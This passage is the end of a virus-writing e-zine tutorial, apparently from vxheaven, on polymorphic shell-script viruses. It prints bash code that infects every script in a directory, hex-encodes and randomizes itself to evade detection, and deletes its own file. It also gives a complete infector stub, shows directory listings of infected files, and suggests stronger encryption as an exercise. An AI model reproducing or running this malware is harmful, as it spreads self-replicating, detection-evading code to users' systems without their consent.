+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">$HOST</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">tr</span> \xc7 <span style="color: #ff0000;">'\n'</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> <span style="color: #660033;">-v</span> <span style="color: #ff0000;">'#!/bin/sh'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">VIRUS</span>=<span style="color: #ff0000;">&quot;&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">for</span> V <span style="color: #000000; font-weight: bold;">in</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-1</span> <span style="color: #007800;">$1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span> <span style="color: black; font-style: italic;">${#V}</span> <span style="color: #660033;">-eq</span> <span style="color: #000000;">4</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #007800;">VIRUS</span>=<span style="color: #ff0000;">&quot;<span style="color: #007800;">$VIRUS</span> <span style="color: #007800;">$V</span> <span style="color: #007800;">$RANDOM</span>&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;# <span style="color: #007800;">$RANDOM</span><span style="color: #007800;">$VIRUS</span>&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #007800;">$0</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp;</div>
+<p>Even I write "tmp.sh" as the script's name, its real name is "-", to avoid repeating another script's name and also to make more difficult its visibility, as explained in the 3.3.2 chapter.</p>
+<p>What we first try to do is to infect the whole directory. For this we check if the file attacked is a shell script, by using "head", but we keep from trying it with our own shell script, because "-" is interpreted by "head" as the standard input (stdin) and waits for input. So we introduce a check by using an "OR list" and then we will only use the "head" when the file is not "-".</p>
+<p>After, we save the whole "host" file in an environment variable. In that way we keep from saving the "host" file into a temporary file where to attach the viric code. The rest of the code is concatenated into the environment variable, and the result of all this stuff is redirected to the final file, by using a command block ("{}", look for chapter 2.2.1->Command blocks).</p>
+<p>In that block we'll do the following:</p>
+<ul>
+<li>copy the header of our own script, so we have a blank line which is our infection mark, and the usual header of a script.</li>
+<li>copy the command for deleting the temporary file, if any.</li>
+<li>then we use the environment variable $RANDOM to get a random number and for not getting a fixed code for "decrypting" our virus. Here we can do many "decrypting" routines, equal but with different sintax, to make it more difficult to detect.</li>
+<li>after, we copy the call to the temporary file in background, and then, the "host" file's code, but without header (we remove the header '#!/bin/sh' so there are not 2 headers in the same file).</li>
+<li>at last, we take the "cyphered" code and introduce random numbers in it, so the string is not always the same. When we have the final string finished, we copy it into the final "host".</li>
+</ul>
+<p>And with all this we have our infection completed. As we can see, as well as the "cyphered" part, the "decrypted" part vary from infection to infection, even though, the "decrypting" routine can be made more polymorphic; actually, we only have 2 possible routines O:-)</p>
+<p>This way, this is how the polymorphic virus should look like:</p>
+<p><strong>poly1.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">rm</span> .<span style="color: #000000; font-weight: bold;">/</span>- <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #000000; font-weight: bold;">for</span> C <span style="color: #000000; font-weight: bold;">in</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-2</span> <span style="color: #007800;">$0</span><span style="color: black;">&#41;</span>; <span style="color: #000000; font-weight: bold;">do</span> <span style="color: black;">&#91;</span> <span style="color: black; font-style: italic;">${#C}</span> <span style="color: #660033;">-eq</span> <span style="color: #000000;">4</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">&quot;\x<span style="color: #007800;">$(expr substr $C 3 2)</span>\x<span style="color: #007800;">$(expr substr $C 1 2)</span>&quot;</span><span style="color: #000000; font-weight: bold;">&gt;&gt;</span>-; <span style="color: #000000; font-weight: bold;">done</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">sh</span> .<span style="color: #000000; font-weight: bold;">/</span>- <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&amp;</span><br/>
+<span style="color: #666666; font-style: italic;"># virus code goes here hexdumped</span><br/>
+&nbsp;</div>
+<p>The last line of the code is a commented line which contains the whole code in hexadecimal base, so this is the most extended part of the virus.</p>
+<p>Now let's see how it looks like before and after an infection:</p>
+<pre>
+drwxr-sr-x 2 zert users  4096 Aug 5 21:58 .
+drwxr-sr-x 3 zert users  4096 Aug 4 20:42 ..
+-rwxr-xr-x 1 zert users    21 Aug 5 22:22 dummy1
+-rwxr-xr-x 1 zert users    21 Aug 5 22:22 dummy2
+-rwxr-xr-x 1 zert users    21 Aug 5 22:22 dummy3
+-rwxr-xr-x 1 zert users    21 Aug 5 22:22 dummy4
+-rwxr-xr-x 1 zert users    21 Aug 5 22:22 dummy5
+-rwxr-xr-x 1 zert users  2628 Aug 5 21:58 poly1.sh
+</pre>
+<p>What we can see here is the tests directory without having infected any "host" file ("dummy" files). "poly1.sh" is our virus' first generation.</p>
+<pre>
+drwxr-sr-x 2 zert users  4096 Aug 5 22:23 .
+drwxr-sr-x 3 zert users  4096 Aug 4 20:42 ..
+-rwxr-xr-x 1 zert users  6552 Aug 5 22:23 dummy1
+-rwxr-xr-x 1 zert users  6527 Aug 5 22:23 dummy2
+-rwxr-xr-x 1 zert users  6564 Aug 5 22:23 dummy3
+-rwxr-xr-x 1 zert users  6589 Aug 5 22:23 dummy4
+-rwxr-xr-x 1 zert users  6538 Aug 5 22:23 dummy5
+-rwxr-xr-x 1 zert users  2628 Aug 5 21:58 poly1.sh
+</pre>
+<p>The same directory after "poly1.sh" was executed. As we can see, the size of every file is different, even they started with the same size. Another important point is that the first generation of the virus ("poly1.sh" before infecting) has a smaller size than the second generation virus, which has a size near 6500 bytes :-)</p>
+<p>We can make it much more difficult by using "factor" to get the prime factors of a number. That number could be the ASCII code of the virus or each line or a reversible calculus between them. With "factor" we cypher owr code and with a multiplication between the gotten factors (expr OP1 * OP2) we "decypher" the code. Writing an example for this is a proposed exercise for the reader O;-P</p>
+<h2><a name="c4"></a>4. Conclusions</h2>
+<h3><a name="c41"></a>4.1. The future of the shell scripts</h3>
+<p>As we could have seen through this little tutorial, there are many posibilities to let us play with shell script viruses. I say play because I do not think these can be considered potential viruses due to their time excess, size in "host" and the common property of the shell scripts, which is being human readable (ASCII text human readable).</p>
+<p>We talked before about the "home UNIX environments socialization", with the arrival of the BSDs and the different Linux distributions. All this makes a new place for this kind of viruses, sheltered by the new ignorant users.</p>
+<p>The power increment in new processors and the great storing capability that storing devices offer us are helping this kind of viruses, which will diminish the execution delays and will hide the increment in the "host's" size.</p>
+<p>So the conclusion to all this is that shell script viruses are not a real threat for the UNIX systems, but they may have a raising space between them.</p>
+<h3><a name="c42"></a>4.2. Thanks</h3>
+<p>Now, to finish, I would like to thank Virusbuster the oportunity of writing in the best e-zine of the viruscene known worldwide, I am really glad about it ;-)</p>
+<p>Thanks haLLs for helping me translating this to english O:-) and giving new ideas, zgor for his comments about permissions in shell scripts, as well as all the int80h group for their support and for their wants of working in this.</p>
+<p>Thanks Snakebyte and Gobleen Warrior for motivating me to write this little tutorial with their excellent texts.</p>
+<p>To all the GNU community that works day to day for a better software, open and free: you are awesome ;-)</p>
+<h2><a name="c5"></a>5. References</h2>
+<ul>
+<li>http://www.linuxdoc.org/LDP/abs/html "Advanced Bash-Scripting Guide: A complete guide to shell scripting, using bash", Mendel Cooper.</li>
+<li>http://www.coderz.net/29a "<a href="/lib/vsn00.html">Linux Shell Script Viren</a>", SnakeByte.</li>
+<li>"<a href="/lib/vgw00.html">UNIX SH and BASH shell viruses</a>", Gobleen Warrior//SMF 1901.</li>
+</ul>
+[<a style="" href="/lib/?lang=EN&amp;index=UN#vze01">Back to index</a>] [<a href="/lib/vze01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vze01">de</a><a href="/lib/index.php?lang=en&amp;id=vze01">en</a><a href="/lib/index.php?lang=es&amp;id=vze01">es</a><a href="/lib/index.php?lang=it&amp;id=vze01">it</a><a href="/lib/index.php?lang=fr&amp;id=vze01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vze01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vze01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vze01">ua</a></div>
+</body>
+</html>
